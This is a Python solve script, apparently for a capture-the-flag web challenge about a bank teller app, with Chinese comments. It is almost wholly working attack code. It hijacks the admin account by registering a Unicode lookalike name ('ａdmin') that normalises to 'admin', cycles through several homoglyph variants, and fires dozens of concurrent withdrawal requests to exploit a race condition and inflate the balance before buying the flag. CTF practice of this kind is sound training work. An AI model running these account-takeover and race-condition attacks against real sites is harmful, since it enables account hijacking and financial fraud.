# -*- coding: utf-8 -*-
"""
夜班柜员(63) 一把梭
1) NFKC 影子接管：注册 ａdmin 覆盖 admin 密码
2) 出厂楔子：admin = 100 存款 / 0 现金（不要先单提！）
3) 提现 TOCTOU：60 路并发 POST /withdraw amount=100
4) 现金 >= 5000 后 POST /buy_flag

用法：
  python solve_shadow_race.py                # 用默认实例
  python solve_shadow_race.py ip:port        # 指定实例
  python solve_shadow_race.py --rounds 12    # 多打几轮放大
"""
import urllib.request, urllib.parse, http.cookiejar, re, threading, collections
import random, sys

def parse_base(argv):
    for a in argv[1:]:
        if re.fullmatch(r"[\d.]+:\d+", a):
            return f"http://{a}"
    return "http://103.163.47.230:33765"

BASE = parse_base(sys.argv)
ROUNDS = 8
if "--rounds" in sys.argv:
    ROUNDS = int(sys.argv[sys.argv.index("--rounds") + 1])

def make_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def post(opener, path, data, cookie=None):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(BASE + path, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with opener.open(req, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)

def get(opener, path):
    try:
        with opener.open(BASE + path, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)

def msg(html):
    return re.findall(r'class="msg[^"]*"[^>]*>([^<]*)', html)

def nums(html):
    return re.findall(r'class="num">([^<]*)', html)

def badge(html):
    return 'class="badge"' in html

def session_of(cj):
    for c in cj:
        if c.name == "session":
            return c.value
    return ""

def login(u, p):
    op, cj = make_opener()
    st, html = post(op, "/login", {"username": u, "password": p})
    ok = bool(list(cj)) and not msg(html)
    return op, cj, ok, html

def dash(op):
    st, html = get(op, "/dashboard")
    return nums(html), html

# ---------- 1. 影子接管 ----------
pw = "WIN" + str(random.randint(1000, 9999))
op, cj = make_opener()
st, html = post(op, "/register", {"username": "ａdmin", "password": pw})
print("shadow register:", msg(html))
opa, cja, oka, ha = login("admin", pw)
print("admin login:", oka, "badge:", badge(ha) if oka else None)
if not oka:
    sys.exit("login failed —— 实例可能被污染，重建：python _api.py cd 63 && sleep 25 && python _api.py cc 63")
n, hh = dash(opa)
print("INITIAL:", n)
sess = session_of(cja)
if not n or int(n[0]) < 100:
    print("!! 存款不足 100，楔子可能已被提走。重建实例后再跑。")

# ---------- 2. 并发提现（不先单提） ----------
def fire(sess, count=60):
    results = []
    lock = threading.Lock()

    def one():
        req = urllib.request.Request(
            BASE + "/withdraw",
            data=urllib.parse.urlencode({"amount": "100"}).encode(),
            method="POST",
        )
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("Cookie", f"session={sess}")
        try:
            with urllib.request.urlopen(req, timeout=20) as r:
                html = r.read().decode("utf-8", "replace")
            with lock:
                results.append(msg(html)[:1])
        except Exception as e:
            with lock:
                results.append(str(e)[:40])

    ths = [threading.Thread(target=one) for _ in range(count)]
    random.shuffle(ths)
    for t in ths:
        t.start()
    for t in ths:
        t.join()
    return results

for rnd in range(ROUNDS):
    # 重新影子注册，防止中途被改密
    post(make_opener()[0], "/register", {"username": "ａdmin", "password": pw})
    opa, cja, oka, _ = login("admin", pw)
    n = dash(opa)[0] if oka else None
    sess = session_of(cja) or sess
    print(f"\n--- round {rnd} before: {n} ---")
    if n and int(n[1]) >= 5000:
        print("ALREADY >= 5000")
        break

    # 若存款 < 100，尝试楔子×提现对撞（注册重置 admin 为 100/0，同时并发提现）
    if n and int(n[0]) < 100:
        def do_reg(i):
            names = ["ａ", "ⓐ", "𝐚", "𝑎", "𝒂", "𝓪", "𝔞", "𝖆"]
            nn = names[i % len(names)] + "dmin"
            post(make_opener()[0], "/register", {"username": nn, "password": f"X{random.randint(0, 10**8)}"})

        def fire_one(s):
            req = urllib.request.Request(
                BASE + "/withdraw",
                data=urllib.parse.urlencode({"amount": "100"}).encode(),
                method="POST",
            )
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("Cookie", f"session={s}")
            try:
                urllib.request.urlopen(req, timeout=15).read()
            except Exception:
                pass

        ths = [threading.Thread(target=do_reg, args=(i,)) for i in range(8)]
        ths += [threading.Thread(target=fire_one, args=(sess,)) for _ in range(20)]
        random.shuffle(ths)
        for t in ths:
            t.start()
        for t in ths:
            t.join()
        post(make_opener()[0], "/register", {"username": "ａdmin", "password": pw})
        opa, cja, oka, _ = login("admin", pw)
        n = dash(opa)[0] if oka else None
        sess = session_of(cja) or sess
        print("  after wedge-collide:", n)

    res = fire(sess, 60)
    succ = sum(1 for m in res if m and "成功" in str(m))
    print(f"  fire60 succ={succ} {collections.Counter(str(m) for m in res)}")
    post(make_opener()[0], "/register", {"username": "ａdmin", "password": pw})
    opa, cja, oka, _ = login("admin", pw)
    n = dash(opa)[0] if oka else None
    sess = session_of(cja) or sess
    print("  after fire:", n)
    if n and int(n[1]) >= 5000:
        print("TARGET HIT", n)
        break

# ---------- 3. 买 flag ----------
print("\n--- BUY FLAG ---")
post(make_opener()[0], "/register", {"username": "ａdmin", "password": pw})
opf, cjf, okf, hf = login("admin", pw)
print("login", okf, dash(opf)[0] if okf else None)
st, html = post(opf, "/buy_flag", {})
print("msg:", msg(html))
flags = re.findall(r"(HTUCTF\{[^}]+\})", html) or re.findall(r"(HTUCTF[0-9a-zA-Z_\-]{0,80})", html)
print("flags:", flags)
fm = re.search(r'class="flag"[^>]*>([^<]+)', html)
if fm:
    print("flag div:", fm.group(1))
for t in re.findall(r">([^<]{10,150})<", html):
    if any(k in t for k in ("HTU", "flag", "恭喜", "成功", "{", "贵客")):
        print("text:", t)

print("DONE")
